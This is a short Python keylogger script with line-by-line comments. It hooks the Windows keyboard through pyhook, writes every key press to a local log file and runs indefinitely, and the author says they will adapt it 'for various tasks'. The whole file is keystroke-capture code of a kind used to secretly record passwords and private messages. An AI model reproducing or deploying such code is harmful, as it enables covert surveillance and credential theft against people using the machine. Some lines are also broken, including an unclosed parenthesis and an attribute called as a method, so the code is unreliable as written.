import pyhook    #used for hooking the keyboard
import pythoncom #used for PumpMessages method to pump messages for the current thread
import logging   #used to make a file log for the keyboard presses

filePath = "C:\\Keylogger\\Log.txt" #this is just an example address where u want ur log file

def OnKeyBoardEvent(event):
   #The basic configuration of logging technique
   logging.basicConfig(filename = filePath, level =logging.DEBUG, format = "%(message)s")
   #converts the ascii values to characters
   chr(event.Ascii())
   #log the keys to the logfile and 10 denotes DEBUG level
   logging.log(10,chr(event.Ascii())
   return True
   
hk= pyhook.HooksManager() #a pyhook object
hk.KeyDown = OnKeyBoardEvent #whenever a key is pressed down, the method is called
hk.HookKeyboard() #hook the keyboard
pythoncom.PumpMessages() #wait for ever for inputs

   
#I will modify it further for various tasks
